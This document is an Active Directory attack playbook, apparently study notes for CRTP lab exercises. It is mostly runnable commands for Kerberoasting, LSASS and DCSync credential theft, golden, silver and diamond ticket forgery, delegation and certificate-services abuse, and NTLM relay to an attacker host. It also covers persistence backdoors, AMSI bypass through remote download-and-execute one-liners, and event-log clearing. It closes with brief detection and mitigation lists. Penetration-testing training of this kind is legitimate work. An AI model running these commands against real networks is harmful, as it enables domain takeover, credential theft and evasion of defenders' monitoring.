# Active Directory Attack Methodology & Techniques

## 1. RECONNAISSANCE & ENUMERATION METHODOLOGY

### Phase 1: Initial Enumeration (No Privileges Required)

#### Domain & Forest Enumeration
- [ ] Enumerate all users in the domain
- [ ] Enumerate all computers/machines in the domain
- [ ] Enumerate all groups and group memberships
- [ ] Enumerate Domain Admins and Enterprise Admins
- [ ] Identify all Organizational Units (OUs)
- [ ] List all computers/users in each OU
- [ ] Enumerate Group Policies (GPOs) in each domain
- [ ] Identify GPOs applied to specific OUs
- [ ] Identify the forest structure and all domains
- [ ] Map all domain trusts (intra-forest and external)
- [ ] Identify trust directions (one-way vs bidirectional)
- [ ] Document external/non-transitive trusts

#### Network & Service Discovery
- [ ] Scan for SMB shares accessible to current user
- [ ] Identify shares with Write permissions
- [ ] Enumerate file shares for sensitive data
- [ ] Identify SQL Server instances in domain
- [ ] Identify web services and APIs
- [ ] Enumerate certificate authority (CA) and AD CS templates
- [ ] Identify SPNs and associated service accounts

#### User & Machine Analysis
- [ ] Identify users with service principal names (SPNs)
- [ ] Find machines with Unconstrained Delegation enabled
- [ ] Find machines with Constrained Delegation enabled
- [ ] Identify RBCD (Resource-Based Constrained Delegation) configurations
- [ ] List user account control (UAC) flags for users
- [ ] Identify accounts with "Do Not Expire Password" setting

### Phase 2: ACL & Permission Analysis

#### Access Control Lists (ACLs)
- [ ] Enumerate ACLs for Domain Admins group
- [ ] Enumerate ACLs for Enterprise Admins group
- [ ] Find interesting ACLs on user objects
- [ ] Find interesting ACLs on computer objects
- [ ] Find interesting ACLs on group objects
- [ ] Find interesting ACLs on GPO objects
- [ ] Identify GenericAll/GenericWrite permissions
- [ ] Identify WriteDACL permissions
- [ ] Identify WriteProperty permissions
- [ ] Identify ForceChangePassword permissions
- [ ] Identify AllExtendedRights permissions

#### User Permissions
- [ ] List all ACLs where compromised user has interesting permissions
- [ ] Identify group memberships of compromised user
- [ ] Check ACLs for groups user is member of
- [ ] Find derivative admin access through group membership
- [ ] Identify DCSync rights (Replication rights)

### Phase 3: Threat Modeling & Path Finding

#### BloodHound Analysis
- [ ] Upload data to BloodHound (Legacy or CE)
- [ ] Find shortest paths to Domain Admin
- [ ] Find shortest paths to Enterprise Admin
- [ ] Identify high-risk ACL paths
- [ ] Identify Kerberoasting targets
- [ ] Identify Unconstrained Delegation paths
- [ ] Identify Constrained Delegation paths
- [ ] Map database links and SQL server paths
- [ ] Analyze derivative admin access

#### Privilege Escalation Paths
- [ ] Check for local admin access on machines
- [ ] Identify machines where DA sessions exist
- [ ] Find machines accessible via current credentials
- [ ] Analyze trust relationships for escalation paths

### Phase 4: Security Configuration Assessment

#### Application Security
- [ ] Check for Applocker policies
- [ ] Enumerate Applocker rule exceptions
- [ ] Identify CLM (Constrained Language Mode)
- [ ] Check AMSI implementations
- [ ] Identify PowerShell version and logging settings
- [ ] Check for Windows Defender/MDE

#### Authentication & Cryptography
- [ ] Identify supported encryption types for users
- [ ] Check for pre-authentication requirements
- [ ] Identify accounts with AES support
- [ ] Check for SID History usage

---

## 2. ATTACK TECHNIQUES & EXPLOITATION

### Category A: Credential Access & Extraction

#### A.1 Kerberoasting
**Prerequisites:** Network access to domain
**Target:** Service accounts with SPNs
**Tools:** PowerView, Rubeus, Impacket

```
Steps:
1. Identify users with SPNs using Get-DomainUser -SPN
2. Request TGS for target SPN using Rubeus kerberoast
3. Crack hash offline using John the Ripper or Hashcat
4. Extract plaintext password or NT hash
```

**Evasion:**
- Use `/rc4opsec` to only target RC4 accounts
- Time requests over longer periods
- Use LDAP queries instead of direct requests

---

#### A.2 LSASS Credential Dumping
**Prerequisites:** Local Administrator access
**Tools:** Mimikatz, SafetyKatz, Invoke-Mimikatz, minidumpdotnet

```
Steps:
1. Gain local admin on target machine
2. Execute SafetyKatz: sekurlsa::evasive-keys
3. Extract plaintext passwords (if logged in user session)
4. Extract Kerberos keys (AES256, RC4)
5. Extract NTLM hashes
6. Use extracted credentials for further compromise
```

**Evasion:**
- Use minidumpdotnet.dll (custom API implementation)
- Dump to file and transfer via SMB to avoid network detection
- Use reverse.exe to reverse LSASS dump before parsing
- Avoid suspicious memory access patterns

---

#### A.3 Credential Vault Dumping
**Prerequisites:** Local Administrator access
**Tools:** Mimikatz (vault::cred), SafetyKatz

```
Steps:
1. Elevate to SYSTEM or high-integrity process
2. Execute: vault::cred /patch
3. Extract credentials stored in Windows Credential Vault
4. Use extracted service account credentials
```

**Use Case:** Find service account credentials stored in vault by privileged users

---

#### A.4 Domain Controller Credential Extraction
**Prerequisites:** Domain Admin access
**Tools:** SafetyKatz, ntdsutil

```
Steps:
1. Achieve Domain Admin privileges
2. Copy ntds.dit from \\DC\ADMIN$\system32\config
3. Execute: lsadump::lsa /patch to extract SYSTEM hive
4. Use offline tool to extract hashes
Alternative: Use DCSync (LSADump::dcsync) instead
```

---

#### A.5 DCSync Attack
**Prerequisites:** DCSync rights or Domain Admin
**Tools:** SafetyKatz, Impacket, PowerView

```
Steps:
1. Verify DCSync rights using PowerView: Get-DomainObjectAcl
2. Execute: lsadump::dcsync /user:domain\krbtgt /domain:domain.com
3. Extract all domain user hashes
4. Use extracted krbtgt hash for Golden Ticket creation
```

**Adding DCSync Rights:**
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' 
  -PrincipalIdentity username -Rights DCSync
```

---

### Category B: Privilege Escalation - Local

#### B.1 Unquoted Service Path Exploitation
**Prerequisites:** Local machine access, SYSTEM-running service with unquoted path
**Tools:** PowerUp, WinPEAS, PrivEscCheck

```
Steps:
1. Identify unquoted service paths: Get-UnquotedServicePath
2. Check if path directories are writable by current user
3. Place malicious executable in path with intercepting name
4. Restart service to execute payload as SYSTEM
5. Service runs: C:\Program.exe instead of "C:\Program Files\app.exe"
```

**Mitigation Check:** Use `Get-DomainComputer` to identify misconfigured services

---

#### B.2 Service Permission Abuse
**Prerequisites:** Ability to modify service binary path or permissions
**Tools:** PowerUp, AccessChk, Invoke-ServiceAbuse

```
Steps:
1. Find services with improper permissions: Invoke-ServiceAbuse
2. Add current user to local Administrators group via service:
   Invoke-ServiceAbuse -Name 'ServiceName' 
     -UserName 'domain\username'
3. Verify group membership after service restart
```

---

#### B.3 Registry-Based Backdoors
**Prerequisites:** Local Administrator access
**Tools:** PowerView (RACE.ps1)

```
Steps:
1. Add remote registry backdoor: Add-RemoteRegBackdoor
2. Grant target user read access to HKLM\SAM
3. Extract DPAPI credentials from registry
4. Use to access additional systems
```

---

### Category C: Privilege Escalation - Domain

#### C.1 Derivative Local Admin Escalation
**Prerequisites:** Local admin on machine with domain user sessions
**Tools:** SafetyKatz, Mimikatz, Invoke-Mimikatz

**Workflow:**
```
Local Admin on Machine → Extract DA/Service Account Creds → 
Domain Admin on DC → Full Domain Compromise
```

**Steps:**
1. Compromise user with local admin access
2. Use Find-PSRemotingLocalAdminAccess to find machines
3. Extract credentials from admin-accessible machines
4. Escalate to domain admin with extracted credentials

---

#### C.2 Group Policy Abuse
**Prerequisites:** WriteDACL or Full Control on GPO
**Tools:** PowerView, GPOddity, ntlmrelayx, LDAP shell

**GPO Abuse via WriteDACL + NTLM Relay:**
```
Technique Overview:
1. Identify user/group with WriteDACL on GPO
2. Use NTLM relay to capture domain admin credentials
3. Relay captured credentials to LDAP
4. Use relayed session to modify GPO DACL
5. Grant Write permissions to compromised user
6. Modify GPO to add malicious scheduled task
7. Force GPO refresh on target machines
8. Achieve code execution on target machines
```

**Implementation:**
```
Step 1: Start ntlmrelayx listener
sudo ntlmrelayx.py -t ldaps://DC_IP -wh attacker_ip --http-port 80,8080

Step 2: Create shortcut file that triggers authentication

Step 3: Copy shortcut to share where automation executes it

Step 4: Use ldap shell to grant WriteDACL:
write_gpo_dacl username {GPO_GUID}

Step 5: Run GPOddity to inject malicious scheduled task

Step 6: Wait for GPO refresh or force with gpupdate /force
```

---

#### C.3 SQL Server Linked Database Exploitation
**Prerequisites:** Access to SQL Server with database links to other instances
**Tools:** PowerUpSQL, HeidiSQL, sqlcmd

**Attack Chain:**
```
User SQL Access → Enumerate Links → 
Crawl through Links → Reach Admin on Remote Server → 
Execute Commands via xp_cmdshell
```

**Steps:**
```powershell
# Enumerate linked servers
select * from master..sysservers

# Execute command through link
select * from openquery("LINKED_SERVER",
  'select @@servername')

# Execute through multiple links (nested)
select * from openquery("SQL1",
  'select * from openquery("SQL2",
    ''exec xp_cmdshell "command"'')')

# Automated crawling
Get-SQLServerLinkCrawl -Instance server.domain.com 
  -Query 'exec master..xp_cmdshell "whoami"'
```

---

#### C.4 Constrained Delegation Abuse (S4U2 Attack)
**Prerequisites:** User/computer account with Constrained Delegation + TGT
**Tools:** Rubeus, PowerView

**Workflow:**
```
Get TGT → S4U2Self → S4U2Proxy → 
Impersonate Admin → Access delegated service
```

**Steps:**
```
1. Identify account with Constrained Delegation:
   Get-DomainUser -TrustedToAuth

2. Obtain credentials or hash of that account

3. Request TGT:
   Rubeus asktgt /user:account /aes256:hash

4. Perform S4U attack:
   Rubeus s4u /user:account /aes256:hash 
     /impersonateuser:Administrator 
     /msdsspn:CIFS/target.domain.com /ptt

5. Access impersonated resource:
   dir \\target.domain.com\c$
```

---

#### C.5 Resource-Based Constrained Delegation (RBCD)
**Prerequisites:** GenericWrite on target computer object
**Tools:** PowerView (Set-DomainRBCD, Get-DomainRBCD)

**Attack Steps:**
```
1. Identify computer with GenericWrite by compromised user:
   Find-InterestingDomainACL | 
     ?{$_.identityreferencename -match "username"}

2. Set RBCD on target computer for student machine:
   Set-DomainRBCD -Identity target_computer 
     -DelegateFrom 'student_machine$'

3. Get student machine hash:
   SafetyKatz "sekurlsa::evasive-keys"

4. Use Rubeus S4U to impersonate admin:
   Rubeus s4u /user:student_machine$ /aes256:hash 
     /msdsspn:http/target /impersonateuser:Administrator /ptt

5. Access target as admin:
   winrs -r:target cmd
```

---

#### C.6 Unconstrained Delegation + Printer Bug
**Prerequisites:** Admin access to machine with Unconstrained Delegation
**Tools:** Rubeus, MS-RPRN, MS-WSP, MS-DFSNM

**Attack Workflow:**
```
Setup Listener on Unconstrained Delegation Machine → 
Force Authentication from Domain Controller → 
Capture DC$ TGT → Use TGT for DCSync → 
Extract krbtgt hash → Create Golden Ticket
```

**Implementation:**
```
1. Start Rubeus monitor on unconstrained delegation machine:
   winrs -r:machine "Rubeus.exe monitor /targetuser:DC$ /interval:5"

2. Force DC authentication to our machine (multiple options):

   Option A - Printer Bug (MS-RPRN):
   MS-RPRN.exe \\dc.domain.com \\target_machine.domain.com

   Option B - Windows Search Protocol (MS-WSP):
   WSPCoerce.exe DC target_machine.domain.com

   Option C - DFS Namespaces (MS-DFSNM):
   DFSCoerce.exe -t dc.domain.com -l target_machine.domain.com

3. Capture TGT from Rubeus monitor output

4. Inject captured TGT:
   Rubeus ptt /ticket:[base64_ticket]

5. Perform DCSync:
   SafetyKatz "lsadump::dcsync /user:krbtgt"
```

---

### Category D: Kerberos Attacks

#### D.1 Golden Ticket Attack
**Prerequisites:** krbtgt hash or AES key
**Tools:** Rubeus, Mimikatz, SafetyKatz

**Steps:**
```
1. Extract krbtgt hash using DCSync or from DC:
   SafetyKatz "lsadump::dcsync /user:krbtgt"
   
   Output includes:
   - krbtgt NTLM hash (RC4)
   - AES256 hash

2. Create golden ticket with Rubeus:
   Rubeus evasive-golden 
     /aes256:hash
     /user:Administrator 
     /id:500
     /pgid:513
     /domain:domain.com
     /sid:S-1-5-21-X-X-X
     /pwdlastset:"11/11/2022 6:34:22 AM"
     /minpassage:1
     /logoncount:152
     /netbios:dcorp
     /groups:544,512,520,513
     /dc:DC.domain.com
     /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
     /ptt

3. Use forged ticket to access any resource in domain:
   winrs -r:dc cmd
```

**OPSEC Considerations:**
- Use evasive-golden for reduced detection
- Inject into new process with /createnetonly
- Use appropriate pwdlastset date
- Include correct group memberships

---

#### D.2 Silver Ticket Attack
**Prerequisites:** Machine account hash or service account hash
**Tools:** Rubeus, Mimikatz

**Steps:**
```
1. Obtain machine account hash:
   - Extract from LSASS: sekurlsa::evasive-keys
   - From SAM (local admin): lsadump::sam
   - Via RACE.ps1: Get-RemoteMachineAccountHash

2. Create silver ticket for HTTP service (WinRM):
   Rubeus evasive-silver 
     /service:http/dc.domain.com 
     /rc4:machine_hash
     /sid:S-1-5-21-X-X-X
     /user:Administrator
     /domain:domain.com
     /ptt

3. Create silver ticket for HOST and RPCSS (WMI):
   Rubeus evasive-silver 
     /service:host/dc.domain.com 
     /rc4:machine_hash
     /sid:S-1-5-21-X-X-X
     /user:Administrator
     /domain:domain.com
     /ptt

   Rubeus evasive-silver 
     /service:rpcss/dc.domain.com 
     /rc4:machine_hash
     /sid:S-1-5-21-X-X-X
     /user:Administrator
     /domain:domain.com
     /ptt

4. Access service:
   winrs -r:dc.domain.com cmd
   Get-WmiObject -Class win32_operatingsystem -ComputerName dc
```

---

#### D.3 Diamond Ticket Attack
**Prerequisites:** krbtgt AES256 key, KrbKey for encryption
**Tools:** Rubeus

**Steps:**
```
1. Create diamond ticket (legitimate TGT + forged PAC):
   Rubeus diamond 
     /krbkey:krbtgt_aes256
     /tgtdeleg
     /enctype:aes
     /ticketuser:Administrator
     /domain:domain.com
     /dc:dc.domain.com
     /ticketuserid:500
     /groups:512
     /createnetonly:C:\Windows\System32\cmd.exe
     /show
     /ptt

2. Use ticket to access DC:
   winrs -r:dc cmd
```

**Advantages over Golden Ticket:**
- Avoids timestamping anomalies
- Hybrid approach: real TGT + forged PAC
- Harder to detect timestamp-based detection

---

#### D.4 Pass-the-Ticket (PTT)
**Prerequisites:** Kerberos ticket (.kirbi format or base64)
**Tools:** Rubeus, Mimikatz

**Steps:**
```
1. Export ticket to base64:
   Rubeus dump /service:krbtgt

2. Inject into current process:
   Rubeus ptt /ticket:[base64_ticket]

3. Use injected ticket:
   winrs -r:target cmd
   dir \\target\c$
```

---

#### D.5 Over-Pass-the-Hash (OPtH)
**Prerequisites:** User NTLM hash or AES key, not actual password
**Tools:** Rubeus, Mimikatz (sekurlsa::pth)

**Steps:**
```
1. Extract hash/key from compromised machine:
   SafetyKatz "sekurlsa::evasive-keys"

2. Create new process with hash:
   Rubeus asktgt 
     /user:username
     /ntlm:hash
     /opsec
     /createnetonly:C:\Windows\System32\cmd.exe
     /show
     /ptt

   OR with AES:
   Rubeus asktgt 
     /user:username
     /aes256:hash
     /opsec
     /createnetonly:C:\Windows\System32\cmd.exe
     /show
     /ptt

3. Use new process to access resources as that user
```

---

#### D.6 Pass-the-Hash (PTH) for NTLM Authentication
**Prerequisites:** User NTLM hash, target supports NTLM
**Tools:** Mimikatz (sekurlsa::pth), SafetyKatz

**Steps:**
```
1. Start new process with hash (SYSTEM/DSRM admin):
   SafetyKatz "sekurlsa::pth 
     /domain:dc_name
     /user:Administrator
     /ntlm:hash
     /run:cmd.exe"

2. From new process, access resources:
   winrs -r:dc cmd (requires TrustedHosts config)
   dir \\dc\c$
```

---

### Category E: Abuse of Trust Relationships

#### E.1 Inter-Realm TGT Attack (Parent Domain Compromise)
**Prerequisites:** Domain Admin in child domain, trust key, krbtgt hash of child domain
**Tools:** Rubeus, PowerView

**Steps:**
```
1. Extract trust key (inter-realm trust account):
   SafetyKatz "lsadump::trust /patch"
   
   Output includes:
   - Trust account hash/keys
   - Trust direction and type

2. Create referral ticket for parent domain:
   Rubeus evasive-silver 
     /service:krbtgt/CHILD.PARENT.LOCAL
     /rc4:trust_hash
     /sid:S-1-5-21-[CHILD-SID]
     /user:Administrator
     /domain:child.parent.local
     /nowrap

3. Request TGS for parent domain service:
   Rubeus asktgs 
     /service:http/parent-dc.parent.local
     /dc:parent-dc.parent.local
     /ticket:[referral_ticket_base64]
     /ppt

4. Inject TGS and access parent domain DC:
   winrs -r:parent-dc.parent.local cmd
```

**Alternative - Using krbtgt hash directly:**
```
Rubeus evasive-golden 
  /user:Administrator
  /id:500
  /domain:child.parent.local
  /sid:S-1-5-21-[CHILD-SID]
  /sids:S-1-5-21-[PARENT-SID]-519  [Enterprise Admins SID]
  /aes256:child_krbtgt_hash
  /netbios:child
  /ppt
```

---

#### E.2 External Trust Abuse
**Prerequisites:** DA access to domain with external trust, clear-text trust password/hash
**Tools:** Rubeus, PowerView, SafetyKatz

**Constraints:**
- SID Filtering enabled (cannot add arbitrary SIDs)
- Only trusted groups allowed
- Requires clear-text trust key or hash

**Steps:**
```
1. Extract external trust key:
   SafetyKatz "lsadump::trust /patch"

2. Create referral ticket:
   Rubeus evasive-silver 
     /service:krbtgt/EXTERNAL.LOCAL
     /rc4:trust_hash
     /sid:S-1-5-21-[TRUSTED-DOMAIN-SID]
     /user:Administrator
     /domain:current.local

3. Request service ticket:
   Rubeus asktgs 
     /service:cifs/external-dc.external.local
     /dc:external-dc.external.local
     /ticket:[referral_ticket]
     /ppt

4. Access explicitly shared resources:
   dir \\external-dc.external.local\SharedWithCurrent
```

---

### Category F: Active Directory Certificate Services (AD CS) Abuse

#### F.1 ESC1 - Privilege Escalation via Certificate Enrollment
**Prerequisites:** 
- Vulnerable certificate template with:
  - `ENROLLEE_SUPPLIES_SUBJECT` flag (subject name changeable)
  - Client Authentication EKU
  - User has enrollment rights

**Tools:** Certify, OpenSSL, Rubeus

**Steps:**
```
1. Identify vulnerable templates:
   Certify.exe find /enrolleeSuppliesSubject

2. Request certificate for Domain Admin:
   Certify.exe request 
     /ca:ca-server\ca-name
     /template:VulnerableTemplate
     /altname:Administrator
     /sid:S-1-5-21-X-X-X-500

3. Convert PEM to PFX:
   openssl.exe pkcs12 
     -in cert.pem 
     -keyex 
     -CSP "Microsoft Enhanced Cryptographic Provider v1.0"
     -export 
     -out cert.pfx
   [Enter password]

4. Request TGT using certificate:
   Rubeus.exe asktgt 
     /user:Administrator
     /certificate:cert.pfx
     /password:password
     /ptt

5. Verify DA access:
   winrs -r:dc cmd
```

---

#### F.2 ESC3 - Privilege Escalation via Certificate Request Agent
**Prerequisites:**
- Template with Certificate Request Agent EKU (signed requests)
- Template with client auth EKU requiring request agent signature
- User has enrollment rights

**Tools:** Certify, OpenSSL, Rubeus

**Steps:**
```
1. Identify vulnerable ESC3 chain:
   Certify.exe find /vulnerable

2. Request Enrollment Agent certificate:
   Certify.exe request 
     /ca:ca-server\ca-name
     /template:EnrollmentAgentTemplate

3. Convert to PFX (agent certificate):
   openssl.exe pkcs12 -in agent.pem ... -out agent.pfx

4. Use agent cert to request certificate for target:
   Certify.exe request 
     /ca:ca-server\ca-name
     /template:SignedTemplate
     /onbehalfof:DOMAIN\Administrator
     /enrollcert:agent.pfx
     /enrollcertpw:password

5. Convert to PFX (target certificate):
   openssl.exe pkcs12 -in target.pem ... -out target.pfx

6. Request TGT with target certificate:
   Rubeus.exe asktgt 
     /user:Administrator
     /certificate:target.pfx
     /password:password
     /ptt

7. Verify access:
   winrs -r:dc cmd
```

---

### Category G: Persistence Techniques

#### G.1 Golden Ticket for Persistence
**Usage:** Long-term access even after password changes
**Steps:**
```
1. Create golden ticket valid for 10 years:
   Rubeus evasive-golden 
     /aes256:krbtgt_hash
     /user:Administrator
     /id:500
     /domain:domain.com
     /sid:S-1-5-21-X-X-X
     /endin:3650  [10 years]
     /ptt

2. Store ticket securely for later use

3. Can use ticket anytime within validity period
```

---

#### G.2 DSRM Administrator Backdoor
**Prerequisites:** Domain Admin access to DC
**Tools:** SafetyKatz, Mimikatz, PowerView

**Steps:**
```
1. Extract DSRM administrator hash (runs on DC in safe mode):
   SafetyKatz "token::elevate" "lsadump::sam"

2. Enable network logon for DSRM admin:
   winrs -r:dc "reg add 
     HKLM\System\CurrentControlSet\Control\Lsa 
     /v DsrmAdminLogonBehavior 
     /t REG_DWORD /d 2 /f"

3. Use Pass-the-Hash to access DC:
   SafetyKatz "sekurlsa::pth 
     /domain:dc_name
     /user:Administrator
     /ntlm:dsrm_hash
     /run:cmd.exe"

4. Access DC from spawned process:
   winrs -r:dc cmd
   Enter-PSSession -ComputerName dc_ip 
     -Authentication NegotiateWithImplicitCredential
```

---

#### G.3 Shadow Credentials (msDS-KeyCredentialLink)
**Prerequisites:** GenericWrite on user object
**Tools:** PowerView, pywhisker (Python)

```
# Adds alternative credential to user account
# Survives password changes
# Alternative to modifying passwords or adding group membership
```

---

### Category H: Defense Evasion

#### H.1 Applocker Bypass via Program Files
**Prerequisites:** Local admin on locked-down machine, Applocker allows Program Files
**Technique:** Copy PowerShell scripts to C:\Program Files and execute

**Steps:**
```
1. Identify Applocker rules:
   winrs -r:target "reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script"

2. Copy script to Program Files:
   Copy-Item script.ps1 \\target\c$\'Program Files'

3. Execute from Program Files (bypasses Applocker):
   [target]: PS C:\Program Files> .\script.ps1
```

---

#### H.2 Constrained Language Mode (CLM) Bypass
**Scenario:** PowerShell Remoting drops into CLM on target
**Solutions:**

A) Modify script to not require dot-sourcing:
```powershell
# Instead of: . .\Invoke-Mimi.ps1
# Include function call directly in script:
# Add to end: Invoke-Mimikatz -Command "sekurlsa::evasive-keys"
```

B) Use Full Language Mode binary executables

C) Disable CLM via GPO (if DA access)

---

#### H.3 AMSI Bypass
**Tools:** sbloggingbypass.txt, Amsi-Byp.txt (provided in lab)

**Implementation:**
```powershell
# Bypass Enhanced Script Block Logging:
iex (New-Object System.NET.WebClient).DownloadString('http://server/sbloggingbypass.txt')

# Bypass AMSI:
iex (New-Object System.NET.WebClient).DownloadString('http://server/Amsi-Byp.txt')

# Then load your tool:
iex (New-Object System.NET.WebClient).DownloadString('http://server/PowerView.ps1')
```

---

#### H.4 Event Log Evasion
**Prerequisites:** Local or Domain Admin
**Techniques:**
- Clear event logs: `wevtutil cl security`
- Disable logging: Group Policy
- Forward logs to external server

---

### Category I: Tools & Commands Reference

#### PowerView Commands
```powershell
# Domain Enumeration
Get-Domain
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainOU
Get-DomainGPO
Get-DomainTrust
Get-ForestDomain

# ACL & Permission Analysis
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Find-InterestingDomainACL -ResolveGUIDs
Find-DomainUserLocation  # Find where users are logged in
Find-DomainComputerLocation

# Delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Get-DomainRBCD

# File Shares
Find-DomainShare

# SQL Server (via PowerUpSQL)
Get-SQLInstanceDomain
Get-SQLServerLinkCrawl -Instance server
```

#### Rubeus Commands
```
# Kerberoasting
Rubeus kerberoast /user:target /simple /rc4opsec /outfile:hashes.txt

# OverPass-the-Hash
Rubeus asktgt /user:username /aes256:hash /opsec /createnetonly:cmd.exe /show /ptt

# Request Service Ticket
Rubeus asktgs /service:cifs/target /ticket:[ticket_base64] /ppt

# Constrained Delegation (S4U)
Rubeus s4u /user:account /aes256:hash /impersonateuser:Administrator /msdsspn:CIFS/target /ptt

# Golden Ticket
Rubeus evasive-golden /aes256:krbtgt_hash /user:Administrator /id:500 /domain:domain.com /sid:SID /ppt

# Silver Ticket
Rubeus evasive-silver /service:http/dc /rc4:hash /user:Administrator /domain:domain.com /ppt

# Monitor for TGTs
Rubeus monitor /targetuser:DC$ /interval:5 /nowrap

# Import Ticket
Rubeus ptt /ticket:[base64_ticket]

# Diamond Ticket
Rubeus diamond /krbkey:krbtgt_aes256 /tgtdeleg /enctype:aes /user:Administrator /domain:domain.com /ppt
```

#### SafetyKatz Commands
```
# Credential Extraction
sekurlsa::evasive-keys           # Extract all Kerberos keys
sekurlsa::logonpasswords         # Extract plaintext passwords
sekurlsa::minidump               # LSASS dump
lsadump::sam                     # Local SAM hashes
lsadump::lsa /patch              # Extract SYSTEM/SAM via registry
lsadump::dcsync /user:krbtgt     # DCSync attack
lsadump::trust /patch            # Extract trust keys
vault::cred /patch               # Extract Credential Vault
```

#### PowerUpSQL Commands
```powershell
# Database Enumeration
Get-SQLInstanceDomain | Get-SQLServerinfo

# Link Crawling
Get-SQLServerLinkCrawl -Instance server.domain.com
Get-SQLServerLinkCrawl -Instance server -Query "exec master..xp_cmdshell 'whoami'"

# Exploit Linked Servers
select * from openquery("SERVER",'select @@servername')
```

---

## 3. ATTACK FLOWCHARTS & DECISION TREES

### Flowchart: From User to Domain Admin

```
START: Compromised User (Domain User)
    ↓
┌─→ Enumerate ACLs → Find interesting permissions?
│   NO → Try Kerberoasting → Get service account?
│   NO → Find local admin machine → Compromise it
│   NO → Check database links → Exploit SQL servers
│   YES → Exploit ACL permission → Escalate privileges
│
YES → Exploit GenericAll/WriteDACL on:
      - User (reset password/add to group)
      - Group (add self to admin group)
      - Computer (RBCD, modify attributes)
      - GPO (inject malicious policy)
    ↓
[Escalated User/Admin Privileges]
    ↓
YES → Find DA session on machine → Extract credentials
    ↓
[DOMAIN ADMIN]
```

### Flowchart: Finding Privilege Escalation Paths

```
Current User
    ↓
1. List Local Admin Access:
   Find-PSRemotingLocalAdminAccess
    ↓
2. On Admin Machine:
   - Extract credentials from LSASS
   - Check Credential Vault
   - Review registry
    ↓
3. Use Extracted Creds → Compromised User (repeat from start)
   OR
   3b. Extracted cred is DA → Mission Complete

If stuck on step 1:
    → Check ACLs for alternative paths
    → Exploit Kerberoasting
    → Exploit database links
    → Check for Unconstrained Delegation
```

---

## 4. QUICK REFERENCE: Indicators of Compromise

### Log Events to Monitor
- Event ID 4624: Successful logon (look for unusual times/locations)
- Event ID 4625: Failed logons (brute force attempts)
- Event ID 4688: Process creation (suspicious executables)
- Event ID 4768: Kerberos authentication ticket request (Kerberoasting)
- Event ID 4769: Kerberos service ticket request (normal activity)
- Event ID 4776: NTLM authentication (Pass-the-Hash candidates)
- Event ID 5136: LDAP object modified (AD changes)
- Event ID 5140: Share accessed (unusual access patterns)

### Suspicious Activities
- Multiple failed logons followed by success
- Logons at unusual times
- Access to sensitive shares
- LSASS process access/dumping
- Kerberos ticket requests for service accounts
- PowerShell script execution with AMSI bypass patterns
- Execution from unusual locations (Program Files, TEMP, etc.)
- Service creation/modification
- GPO modifications
- Trust key extraction attempts

---

## 5. DEFENSIVE MITIGATIONS

### Prevent Credential Compromise
- [ ] Enable Credential Guard
- [ ] Protect LSASS (RunAsPPL)
- [ ] Disable WDigest
- [ ] Use MFA for sensitive accounts
- [ ] Implement smart card logons
- [ ] Monitor and alert on credential access

### Prevent Privilege Escalation
- [ ] Review and restrict local admin groups
- [ ] Limit service account privileges
- [ ] Implement least privilege
- [ ] Review and fix ACLs regularly
- [ ] Enable LSA Protection
- [ ] Use AppLocker/Windows Defender Application Control

### Prevent Lateral Movement
- [ ] Disable Kerberos delegation where not needed
- [ ] Enable SMB signing/encryption
- [ ] Segment network
- [ ] Monitor PowerShell execution
- [ ] Restrict WinRM access
- [ ] Use conditional access policies

### Prevent Persistence
- [ ] Monitor account creation
- [ ] Audit DSRM access
- [ ] Monitor shadow credentials
- [ ] Regular AD audits
- [ ] Security group membership audits

---

**Document Version:** 1.0  
**Last Updated:** 2026-10-07  
**Purpose:** Educational Reference for CRTP Lab Exercises
